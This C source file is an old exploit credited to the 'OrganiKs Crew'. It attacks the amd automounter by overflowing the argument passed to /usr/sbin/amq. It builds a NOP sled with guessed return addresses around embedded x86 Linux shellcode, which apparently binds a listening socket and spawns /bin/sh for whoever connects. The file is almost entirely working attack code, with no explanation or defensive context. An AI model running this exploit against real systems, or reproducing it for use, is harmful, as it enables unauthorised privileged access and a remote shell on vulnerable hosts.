/*
 
* OrganiKs Crew -> altern.org/organiks | organiks@iname.com
 * Exploit AMD by Lionel -> cronos56@yahoo.com
 
*/


#include <stdlib.h>

#define DEFAULT_OFFSET                 2350
#define DEFAULT_BUFFER_SIZE            998
#define NOP                            0x90

char shellcode[] = 
"\xeb\x10\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xc3\x31\xc0\xb0\x01\xcd"
"\x80\xc3\xe8\xeb\xff\xff\xff\xb0\x06\xcd\x80\xb0\x06\xfe\xc3\xcd"
"\x80\xb0\x06\xfe\xc3\xcd\x80\xb0\x02\xcd\x80\x39\xc1\x75\xdc\xe8"
"\xce\xff\xff\xff\xb0\x02\xb1\x01\xb2\x06\x52\x51\x50\xb3\x01\xb0"
"\x66\x89\xe1\xcd\x80\x89\xc6\xe8\xb6\xff\xff\xff\x83\xc4\x12\x50"
"\xb9\x02\xff\x08\xae\x30\xed\x51\x89\xe2\x83\xec\x06\xb0\x10\x50"
"\xb3\x02\x52\x56\xb0\x66\x89\xe1\xcd\x80\xb0\x10\x50\x56\xb0\x66"
"\xb3\x04\x89\xe1\xcd\x80\xe8\x87\xff\xff\xff\x50\x50\x56\xb0\x66"
"\xb3\x05\x89\xe1\xcd\x80\x31\xc9\x88\xc3\xb0\x29\xcd\x80\xb0\x3f"
"\xcd\x80\xeb\x16\x5e\x88\x4e\x07\x89\x76\x08\x89\x4e\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe5\xff\xff\xff"
"/bin/sh";  

unsigned long get_sp(void)
{
   __asm__("movl %esp,%eax");
}

void main(int argc, char *argv[])
{
   char *buff, *ptr;
   char *args[5];

   long addr;
   int offset, bsize;
   int i;

   bsize  = (argc > 1) ? atoi(argv[1]) : DEFAULT_BUFFER_SIZE;
   offset = (argc > 2) ? atoi(argv[2]) : DEFAULT_OFFSET;

   if(!(buff = malloc(bsize)))
   {
      printf("Can't allocate memory.\n");
      exit(0);
   }

   addr = get_sp() - offset;
   printf("Using address: 0x%x\n", addr);

   for(i = 0; i < bsize; i+=4) *(long*)(&buff[i]) = addr;

   for(i = 0; i < bsize/2; i++) buff[i] = NOP;

   ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
   for(i = 0; i < strlen(shellcode); i++) *(ptr++) = shellcode[i];

   buff[bsize - 1] = '\0';

   args[0]="/usr/sbin/amq";
   args[1]="-h 127.0.0.1 -M ";
   args[2]=buff;
   args[3]=NULL;

   execve(args[0],args,NULL);
}
